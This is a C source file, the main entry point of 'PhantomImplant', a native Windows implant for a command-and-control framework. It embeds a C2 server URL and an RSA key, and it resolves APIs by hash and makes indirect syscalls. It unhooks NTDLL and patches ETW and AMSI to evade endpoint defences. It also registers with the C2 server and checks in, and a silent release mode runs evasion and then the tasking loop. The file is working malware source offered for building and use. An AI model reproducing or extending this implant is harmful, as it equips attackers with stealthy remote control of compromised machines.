/**
 * PhantomImplant - Main Entry Point
 *
 * Native C Windows implant for Phantom C2.
 *
 * Build modes:
 *   DEBUG:      x86_64-w64-mingw32-gcc -DDEBUG_MODE ... (verbose output, test harness)
 *   RELEASE:    x86_64-w64-mingw32-gcc ...              (silent, no console, runs evasion + C2 loop)
 */

#include "common.h"
#include "api.h"
#include "syscalls.h"
#include "crypto.h"
#include "injection.h"
#include "transport.h"
#include "evasion.h"
#include <stdio.h>
#include <stdlib.h>

// =============================================
// Server RSA public key (DER-encoded SPKI)
// UPDATE THIS with your Phantom C2 server's key:
//   cat ~/phantom/configs/server.pub | base64 -d | xxd -i
// =============================================
static const BYTE g_ServerPubKeyDer[] = {0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02, 0x82, 0x01, 0x01, 0x00, 0xA9, 0xB6, 0x54, 0x42, 0xC8, 0xA2, 0x35, 0x0B, 0x28, 0x61, 0xFD, 0x67, 0xF6, 0x01, 0xBE, 0x5F, 0xDA, 0x39, 0xA9, 0x51, 0xC0, 0xCD, 0x02, 0x1C, 0xD3, 0x7D, 0x67, 0x51, 0x49, 0xFF, 0xBF, 0x79, 0x91, 0xD5, 0x0D, 0x1A, 0x30, 0x6F, 0xC1, 0x1F, 0x1D, 0xA3, 0x1F, 0x94, 0x6E, 0xB7, 0x4F, 0xBD, 0xA0, 0x8E, 0x18, 0x96, 0xEB, 0x3A, 0x21, 0xEC, 0xEC, 0x75, 0x4F, 0x20, 0xAC, 0x56, 0x59, 0x68, 0x3B, 0xE8, 0x8B, 0x60, 0x0C, 0x4C, 0x6D, 0x29, 0x65, 0xDF, 0xFA, 0xEE, 0x50, 0xD5, 0xC7, 0xE3, 0x90, 0xB3, 0x18, 0xC2, 0xCB, 0x46, 0x76, 0x57, 0xAC, 0x3D, 0x97, 0x7E, 0x58, 0x4F, 0xFB, 0x2A, 0x75, 0x30, 0xC9, 0x40, 0xB9, 0x3B, 0x22, 0x78, 0xF9, 0xA7, 0x0D, 0x75, 0x7F, 0xD0, 0xF9, 0xAA, 0xC0, 0x28, 0x34, 0x12, 0xFC, 0xDC, 0xED, 0x89, 0x02, 0xFE, 0x4F, 0xA9, 0x77, 0xF0, 0xD1, 0x6F, 0x12, 0x8C, 0x68, 0xA7, 0x52, 0x40, 0xE0, 0x60, 0xEC, 0x2F, 0xE4, 0xCB, 0x88, 0x27, 0xE0, 0x71, 0x3A, 0x02, 0x40, 0xB2, 0xA0, 0x15, 0xA6, 0x7F, 0x1F, 0x02, 0xA2, 0x89, 0x43, 0x41, 0x00, 0x60, 0xF6, 0x7A, 0x3F, 0x39, 0x98, 0x64, 0x98, 0xF1, 0x86, 0xB6, 0x00, 0xB6, 0x35, 0x6C, 0x89, 0x07, 0xC4, 0xD0, 0x63, 0xDB, 0xB6, 0x2C, 0x1C, 0xD0, 0x44, 0x69, 0x04, 0xC9, 0x3E, 0x6B, 0xEB, 0xC6, 0xFE, 0xE5, 0xC6, 0x65, 0xCF, 0x1A, 0xB5, 0x2B, 0xF1, 0x89, 0x24, 0xAD, 0xC3, 0x40, 0x34, 0xF2, 0xE4, 0xC5, 0x16, 0xC1, 0x30, 0xAE, 0x64, 0x9E, 0xE6, 0xCE, 0xB3, 0x6E, 0x0F, 0x09, 0xCD, 0x95, 0xB6, 0xFE, 0x73, 0x37, 0x61, 0xB1, 0xD4, 0x2D, 0xC0, 0x5D, 0xCD, 0x2A, 0x50, 0x28, 0x1B, 0xF5, 0xAC, 0xE1, 0x41, 0xE3, 0x40, 0x85, 0x2D, 0x06, 0x8E, 0xB9, 0xFA, 0xED, 0x17, 0xB9, 0xB4, 0x17, 0x02, 0x03, 0x01, 0x00, 0x01};
static const DWORD g_dwServerPubKeyDerLen = 294;

// =============================================
// CONFIGURATION — Edit these before building
// =============================================
#define C2_SERVER_URL   "http://172.20.41.154:8080"
#define C2_SLEEP_MS     10000
#define C2_JITTER_PCT   20
#define C2_KILL_DATE    ""

// =============================================
// Build implant config struct
// =============================================
static VOID BuildConfig(PIMPLANT_CONFIG pConfig) {
    memset(pConfig, 0, sizeof(IMPLANT_CONFIG));
    strcpy(pConfig->szServerURL, C2_SERVER_URL);
    pConfig->dwSleepMs = C2_SLEEP_MS;
    pConfig->dwJitterPct = C2_JITTER_PCT;
    memcpy(pConfig->bServerPubKey, g_ServerPubKeyDer, g_dwServerPubKeyDerLen);
    pConfig->dwServerPubKeyLen = g_dwServerPubKeyDerLen;
    strcpy(pConfig->szKillDate, C2_KILL_DATE);
}

// =============================================
// DEBUG MODE: Test harness with verbose output
// =============================================
#ifdef DEBUG_MODE

static BOOL TestApiHashing(VOID) {
    printf("[*] Phase 1: API Hashing\n");
    HMODULE hNtdll = GetModuleHandleH(HASHA("NTDLL.DLL"));
    if (!hNtdll) { printf("    [-] Failed ntdll\n"); return FALSE; }
    printf("    [+] ntdll: 0x%p\n", hNtdll);

    HMODULE hK32 = GetModuleHandleH(HASHA("KERNEL32.DLL"));
    if (!hK32) { printf("    [-] Failed kernel32\n"); return FALSE; }
    printf("    [+] kernel32: 0x%p\n", hK32);

    FARPROC pLLA = GetProcAddressH(hK32, HASHA("LoadLibraryA"));
    printf("    [+] LoadLibraryA: 0x%p\n", pLLA);

    FARPROC pReal = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    printf("    [%c] %s real GetProcAddress\n", pLLA == pReal ? '+' : '!', pLLA == pReal ? "MATCH" : "MISMATCH");
    return TRUE;
}

static BOOL TestSyscalls(VOID) {
    printf("\n[*] Phase 1: Indirect Syscalls (HellsHall)\n");
    if (!InitializeNtSyscalls()) { printf("    [-] Failed\n"); return FALSE; }

    printf("    [+] NtAllocateVirtualMemory  SSN: 0x%04lX  SyscallInst: 0x%p\n",
        g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
    printf("    [+] NtProtectVirtualMemory   SSN: 0x%04lX  SyscallInst: 0x%p\n",
        g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
    printf("    [+] NtCreateThreadEx         SSN: 0x%04lX  SyscallInst: 0x%p\n",
        g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);

    PVOID pAddr = NULL; SIZE_T sSize = 4096;
    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
    NTSTATUS s = RunSyscall((HANDLE)-1, &pAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (s == 0 && pAddr) printf("    [+] Allocated 4096 bytes at 0x%p via indirect syscall\n", pAddr);
    else printf("    [-] Alloc failed: 0x%08lX\n", s);
    return TRUE;
}

static BOOL TestEncryption(VOID) {
    printf("\n[*] Phase 2: Encryption\n");
    BYTE testData[] = "Hello PhantomImplant!";
    BYTE origData[sizeof(testData)];
    memcpy(origData, testData, sizeof(testData));

    XorByiKeys(testData, sizeof(testData) - 1, 0x42);
    printf("    [+] XOR encrypted: first byte 0x%02X (was 0x%02X)\n", testData[0], origData[0]);
    XorByiKeys(testData, sizeof(testData) - 1, 0x42);
    printf("    [%c] XOR roundtrip: %s\n", memcmp(testData, origData, sizeof(testData)) == 0 ? '+' : '!',
        memcmp(testData, origData, sizeof(testData)) == 0 ? "PASS" : "FAIL");

    BYTE aesKey[32], aesIv[16];
    srand((unsigned int)GetTickCount());
    GenerateRandomBytes(aesKey, 32);
    GenerateRandomBytes(aesIv, 16);
    PVOID pCipher = NULL; DWORD dwCipherSize = 0;
    if (AesEncrypt(origData, sizeof(origData), aesKey, aesIv, &pCipher, &dwCipherSize)) {
        printf("    [+] AES encrypted: %lu bytes -> %lu bytes\n", (ULONG)sizeof(origData), dwCipherSize);
        HeapFree(GetProcessHeap(), 0, pCipher);
        printf("    [+] AES-256-CBC: OK\n");
    } else { printf("    [-] AES encrypt failed\n"); }
    return TRUE;
}

static BOOL TestEvasion(VOID) {
    printf("\n[*] EDR Evasion\n");
    printf("    [*] Unhooking NTDLL...\n");
    printf("    [%c] NTDLL unhook: %s\n", UnhookNtdll() ? '+' : '-', UnhookNtdll() ? "OK" : "FAILED");
    printf("    [*] Patching ETW...\n");
    printf("    [%c] ETW patch: %s\n", PatchEtw() ? '+' : '-', "OK");
    printf("    [*] Patching AMSI...\n");
    printf("    [%c] AMSI patch: %s\n", PatchAmsi() ? '+' : '-', "OK");
    return TRUE;
}

static BOOL TestC2(VOID) {
    printf("\n[*] Phase 3: C2 Transport\n");
    printf("    [*] Server: %s\n", C2_SERVER_URL);
    printf("    [+] Server RSA public key: %lu bytes (DER embedded)\n", g_dwServerPubKeyDerLen);

    IMPLANT_CONFIG config; BuildConfig(&config);
    if (!TransportInit(&config)) { printf("    [-] TransportInit failed\n"); return FALSE; }
    printf("    [+] WinHTTP session established\n");

    SESSION session = { 0 };
    printf("    [*] Attempting registration...\n");
    if (TransportRegister(&session)) {
        printf("    [+] Registered! AgentID: %s\n", session.szAgentID);
        printf("    [+] Session key ID: %02X%02X%02X%02X%02X%02X%02X%02X\n",
            session.bKeyID[0], session.bKeyID[1], session.bKeyID[2], session.bKeyID[3],
            session.bKeyID[4], session.bKeyID[5], session.bKeyID[6], session.bKeyID[7]);
        printf("    [*] Sending check-in...\n");
        PC2_TASK pTasks = NULL; DWORD dwTaskCount = 0;
        if (TransportCheckIn(&session, NULL, 0, &pTasks, &dwTaskCount))
            printf("    [+] Check-in successful! Tasks: %lu\n", dwTaskCount);
        else printf("    [-] Check-in failed\n");
    } else { printf("    [-] Registration failed (is the C2 server running?)\n"); }
    TransportCleanup();
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("============================================\n");
    printf("  PhantomImplant v0.1 - DEBUG MODE\n");
    printf("  Phantom C2 Compatible\n");
    printf("============================================\n\n");

    // --loop: skip test harness, go straight to C2 loop
    if (argc > 1 && strcmp(argv[1], "--loop") == 0) {
        printf("  [*] Skipping tests, entering C2 loop...\n");
        printf("  [*] Server: %s\n", C2_SERVER_URL);
        printf("============================================\n\n");
        InitializeNtSyscalls();
        ImplantHeapInit();
        IMPLANT_CONFIG config; BuildConfig(&config);
        ImplantMain(&config);
        return 0;
    }

    // --test: run all diagnostic tests then exit
    TestApiHashing();
    TestSyscalls();
    TestEncryption();
    TestEvasion();
    TestC2();

    printf("\n============================================\n");
    printf("  Test mode complete.\n");
    printf("  Run with --loop to enter C2 callback mode.\n");
    printf("============================================\n");
    printf("\n[#] Press <Enter> to quit...\n");
    getchar();
    return 0;
}

#else
// =============================================
// RELEASE MODE: Silent implant, no console output
// =============================================

// Use WinMain instead of main — no console window
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    // Step 1: Initialize indirect syscalls
    InitializeNtSyscalls();

    // Step 2: Initialize private heap for sleep masking
    ImplantHeapInit();

    // Step 3: Run evasion before anything else
    RunAllEvasion();

    // Step 3: Enter C2 loop
    IMPLANT_CONFIG config;
    BuildConfig(&config);
    ImplantMain(&config);

    return 0;
}

#endif // DEBUG_MODE
